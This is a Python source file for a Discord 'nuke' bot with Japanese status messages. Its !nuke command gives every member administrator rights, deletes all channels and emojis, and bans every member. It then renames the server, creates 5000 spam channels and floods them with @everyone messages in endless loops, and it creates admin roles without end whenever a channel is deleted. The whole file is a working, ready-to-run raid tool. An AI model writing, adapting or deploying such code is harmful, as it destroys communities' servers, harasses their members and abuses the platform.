import discord
import requests
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
from flask import Flask
from threading import Thread
app = Flask('')

@app.route('/')
def main():
    return "alive"

def run():
    app.run(host="0.0.0.0", port=8080)

def web():
    server = Thread(target=run)
    server.start()
web()
token = "YOUR BOT TOKEN"

SPAM_CHANNEL = random_contents = ["ch1","ch2","ch3"]

SPAM_MESSAGE = random_contents = [
    "@everyone spam","@everyone spam2","@everyone spam3"  ]

client = commands.Bot(command_prefix="!")


@client.event
async def on_ready():
   print(f'''起動完了しました。起動bot：{client.user} 導入:https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot''')
   await client.change_presence(activity=discord.Game(name="play中のgame | "))

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")

      await role.edit(permissions = Permissions.all())

      print(Fore.MAGENTA + "everyoneに管理者権限を付与することに成功しました。" + Fore.RESET)
    except:
      print(Fore.GREEN + "everyoneに管理者権限を付与することに失敗しました。" + Fore.RESET)

    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"チャンネル{channel.name}の削除に成功しました。" + Fore.RESET)
      except:
        print(Fore.GREEN + f"チャンネル{channel.name} の削除に失敗しました。" + Fore.RESET)

    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator}のBANに成功しました。" + Fore.RESET)

     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator}のBANに失敗しました。" + Fore.RESET)
       
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"絵文字{emoji.name}の削除に成功しました。" + Fore.RESET)

     except:
       print(Fore.GREEN + f"{emoji.name}の削除に失敗しました。" + Fore.RESET)

    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("youname")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator}のBAN解除が成功しました。" + Fore.RESET)

      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator}のBAN解除に失敗しました。" + Fore.RESET)
        
        await guild.edit(name="上書きする鯖名前", description="上書きする鯖説明")
        
    await guild.create_text_channel("ちゃんねるなめ")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")

    amount = 5000
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

@client.event
async def on_guild_channel_delete(ctx):
  while True:
    guild = ctx.guild
    await guild.create_role(name="作成するロールの名前", permissions = Permissions.all())

client.run(token, bot=True)
